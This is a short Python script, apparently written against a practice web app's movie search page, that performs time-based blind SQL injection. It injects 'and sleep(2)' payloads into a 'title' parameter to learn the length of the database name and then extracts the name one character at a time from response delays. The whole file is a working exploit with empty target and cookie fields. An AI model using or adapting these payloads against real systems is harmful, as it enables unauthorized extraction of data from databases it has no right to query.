import requests
import time

HEADER = {
    "Cookie": "  "
}
BASE_URL = ""


def get_database_name_length() -> int:
    count = 0
    for i in range(100):
        url = BASE_URL + "?title=Iron Man' and length(database())={} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        resp = requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            print("长度为{}".format(i))
            count = i
    return count


def get_database_name(count):
    for i in range(count + 1):
        for j in range(33, 127):
            url = BASE_URL + "?title=Iron Man' and ascii(substr(database(),{},1))={} and sleep(2) -- &action=search".format(
                i, j)
            start_time = time.time()
            resp = requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                print(chr(j), end="")


get_database_name(get_database_name_length())
